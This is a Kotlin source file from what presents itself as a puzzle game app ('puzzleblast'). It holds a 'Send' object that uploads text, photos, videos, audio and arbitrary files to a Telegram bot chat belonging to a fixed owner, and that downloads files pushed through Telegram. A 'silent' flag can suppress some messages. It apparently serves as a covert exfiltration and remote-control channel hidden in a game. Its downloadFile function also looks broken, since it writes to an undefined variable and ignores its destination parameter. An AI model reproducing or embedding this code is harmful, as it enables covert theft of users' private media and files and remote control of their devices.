package com.puzzleblast.game.core

import android.util.Log
import com.puzzleblast.game.util.Prefs
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object Send {
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private fun post(method: String, json: JSONObject): JSONObject? {
        return try {
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val req = Request.Builder().url("${BotConfig.apiBase}/$method").post(body).build()
            client.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return null
                JSONObject(resp.body?.string() ?: "{}")
            }
        } catch (e: Exception) {
            null
        }
    }

    suspend fun text(msg: String, replyTo: Long? = null, prefix: String = ""): Boolean = withContext(Dispatchers.IO) {
        if (Prefs.silent && prefix.isEmpty()) return@withContext false
        val chunked = msg.chunked(4000)
        var ok = true
        for ((i, chunk) in chunked.withIndex()) {
            val json = JSONObject().apply {
                put("chat_id", BotConfig.ownerId)
                put("text", (if (i == 0) prefix else "") + chunk)
                put("parse_mode", "HTML")
                if (i == 0 && replyTo != null) put("reply_to_message_id", replyTo)
            }
            if (post("sendMessage", json) == null) ok = false
        }
        ok
    }

    suspend fun photo(file: File, caption: String = ""): Boolean = withContext(Dispatchers.IO) {
        uploadFile("sendPhoto", "photo", file, caption)
    }

    suspend fun video(file: File, caption: String = ""): Boolean = withContext(Dispatchers.IO) {
        uploadFile("sendVideo", "video", file, caption)
    }

    suspend fun audio(file: File, caption: String = ""): Boolean = withContext(Dispatchers.IO) {
        uploadFile("sendAudio", "audio", file, caption)
    }

    suspend fun document(file: File, caption: String = ""): Boolean = withContext(Dispatchers.IO) {
        uploadFile("sendDocument", "document", file, caption)
    }

    private fun uploadFile(method: String, field: String, file: File, caption: String): Boolean {
        return try {
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", BotConfig.ownerId)
                .addFormDataPart("caption", caption)
                .addFormDataPart(field, file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()
            val req = Request.Builder().url("${BotConfig.apiBase}/$method").post(body).build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            false
        }
    }

    suspend fun downloadFile(fileId: String, dest: File): Boolean = withContext(Dispatchers.IO) {
        try {
            val json = JSONObject().put("file_id", fileId)
            val resp = post("getFile", json) ?: return@withContext false
            val path = resp.optJSONObject("result")?.optString("file_path") ?: return@withContext false
            val url = "https://api.telegram.org/file/bot${BotConfig.token}/$path"
            val req = Request.Builder().url(url).build()
            client.newCall(req).execute().use { r ->
                if (!r.isSuccessful) return@withContext false
                file.outputStream().use { out -> r.body?.byteStream()?.copyTo(out) }
                true
            }
        } catch (e: Exception) {
            false
        }
    }
}
